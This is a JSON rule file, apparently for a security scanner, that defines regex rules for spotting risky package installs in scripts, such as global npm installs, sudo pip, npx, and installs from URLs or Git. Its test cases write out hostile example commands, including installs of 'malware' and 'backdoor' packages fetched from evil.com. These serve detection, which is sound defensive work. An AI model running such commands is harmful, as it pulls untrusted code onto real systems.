{
  "$schema": "../rule-schema.json",
  "category": "Package Management",
  "rules": [
    {
      "id": "PKG-001",
      "title": "Global npm package installation",
      "description": "Installing npm packages globally can place malicious code in system paths.",
      "severity": "high",
      "pattern": "\\bnpm\\s+(install|i)\\s+(-g|--global)\\s+\\S+",
      "file_extensions": ["sh", "bash", "zsh", "bat", "cmd", "ps1"],
      "exclude_patterns": [
        "(-g|--global)\\s+(pnpm|yarn|typescript|ts-node|tsx|nodemon|pm2|eslint|prettier|vercel|netlify-cli|firebase-tools|wrangler|create-react-app|http-server|serve|live-server|@angular/cli|@vue/cli|turbo|nx|lerna|concurrently|rimraf|cross-env|dotenv-cli|npm-check-updates|depcheck|np)(@\\S*)?$"
      ],
      "remediation": "Use local package installations. Plugins should not install global packages.",
      "test_cases": {
        "should_match": [
          "npm install -g evil-package",
          "npm i --global backdoor-cli"
        ],
        "should_not_match": [
          "npm install express",
          "npm i lodash"
        ]
      }
    },
    {
      "id": "PKG-002",
      "title": "Global pip package installation via sudo",
      "description": "Using sudo with pip installs packages system-wide, which can affect the entire system.",
      "severity": "high",
      "pattern": "\\bsudo\\s+pip[3]?\\s+install\\b",
      "file_extensions": ["sh", "bash", "zsh", "bat", "cmd", "ps1"],
      "remediation": "Use virtual environments or --user flag for pip installations.",
      "test_cases": {
        "should_match": [
          "sudo pip install evil-package",
          "sudo pip3 install backdoor"
        ],
        "should_not_match": [
          "pip install package",
          "pip3 install --user package"
        ]
      }
    },
    {
      "id": "PKG-003",
      "title": "Yarn global package installation",
      "description": "Installing yarn packages globally can place malicious code in system paths.",
      "severity": "high",
      "pattern": "\\byarn\\s+global\\s+(add|install)\\s+\\S+",
      "file_extensions": ["sh", "bash", "zsh", "bat", "cmd", "ps1"],
      "exclude_patterns": [
        "(add|install)\\s+(pnpm|yarn|typescript|ts-node|tsx|nodemon|pm2|eslint|prettier|vercel|netlify-cli|firebase-tools|wrangler|create-react-app|http-server|serve|live-server|@angular/cli|@vue/cli|turbo|nx|lerna|concurrently|rimraf|cross-env|dotenv-cli|npm-check-updates|depcheck|np)(@\\S*)?$"
      ],
      "remediation": "Use local package installations instead of global.",
      "test_cases": {
        "should_match": [
          "yarn global add evil-cli",
          "yarn global install backdoor"
        ],
        "should_not_match": [
          "yarn add express",
          "yarn install"
        ]
      }
    },
    {
      "id": "PKG-004",
      "title": "Forced package reinstallation",
      "description": "Force-reinstalling packages can overwrite legitimate packages with malicious versions.",
      "severity": "medium",
      "pattern": "\\b(pip[3]?\\s+install\\s+[^\\n]*(--force-reinstall|--force)|npm\\s+(install|i)\\s+[^\\n]*--force)\\b",
      "file_extensions": [],
      "remediation": "Avoid forced package installations. Review why a force install is needed.",
      "test_cases": {
        "should_match": [
          "pip install --force-reinstall evil-package",
          "npm install --force compromised-pkg"
        ],
        "should_not_match": [
          "pip install normal-package",
          "npm install express"
        ]
      }
    },
    {
      "id": "PKG-005",
      "title": "Install from URL",
      "description": "Installing packages directly from URLs bypasses registry security checks.",
      "severity": "high",
      "pattern": "\\b(pip[3]?\\s+install|npm\\s+(install|i))\\s+[^\\n]*https?://[^\\s]+",
      "file_extensions": ["sh", "bash", "zsh"],
      "remediation": "Install packages from official registries only.",
      "test_cases": {
        "should_match": [
          "pip install https://evil.com/malware-1.0.tar.gz",
          "npm install https://evil.com/backdoor.tgz"
        ],
        "should_not_match": [
          "pip install requests",
          "npm install lodash"
        ]
      }
    },
    {
      "id": "PKG-006",
      "title": "npx arbitrary package execution",
      "description": "npx downloads and immediately executes packages without installation. Equivalent to curl|bash but less recognized as dangerous.",
      "severity": "high",
      "pattern": "\\bnpx\\s+[^-\\s]\\S*",
      "exclude_patterns": [
        "\\bnpx\\s+(create-react-app|create-next-app|create-vite|create-svelte|create-vue|create-expo-app|create-turbo|tsc|tsx|ts-node|eslint|prettier|jest|vitest|playwright|cypress|storybook|tailwindcss|shadcn|prisma|drizzle-kit|wrangler|vercel|netlify|firebase|supabase|expo|react-native|degit|giget|serve|http-server|live-server|json-server|kill-port|sort-package-json|npm-check-updates|depcheck|license-checker|madge|source-map-explorer)\\b"
      ],
      "file_extensions": ["sh", "bash", "zsh", "md", "txt", "yaml", "yml"],
      "remediation": "Review npx commands carefully. npx downloads and runs packages immediately without installation â€” verify the package name is correct and trusted.",
      "test_cases": {
        "should_match": [
          "npx evil-package",
          "npx @malicious/cli run",
          "npx backdoor-tool setup"
        ],
        "should_not_match": [
          "npx create-react-app my-app",
          "npx prettier --write .",
          "npx eslint .",
          "npx --version"
        ]
      }
    },
    {
      "id": "PKG-007",
      "title": "Install from Git URL",
      "description": "Installing packages directly from Git repositories bypasses registry security, checksum verification, and audit trails.",
      "severity": "high",
      "pattern": "\\b(go\\s+install\\s+[^\\s]+@|cargo\\s+install\\s+--git\\s|pip[3]?\\s+install\\s+git\\+|gem\\s+install\\s+--source\\s+https?://)",
      "file_extensions": ["sh", "bash", "zsh", "md", "txt"],
      "remediation": "Install packages from official registries. Git-based installs skip integrity checks and can be changed after review.",
      "test_cases": {
        "should_match": [
          "go install github.com/evil/tool@latest",
          "cargo install --git https://github.com/evil/backdoor",
          "pip install git+https://github.com/evil/malware"
        ],
        "should_not_match": [
          "go install golang.org/x/tools/gopls@latest",
          "cargo install ripgrep",
          "pip install requests"
        ]
      }
    }
  ]
}
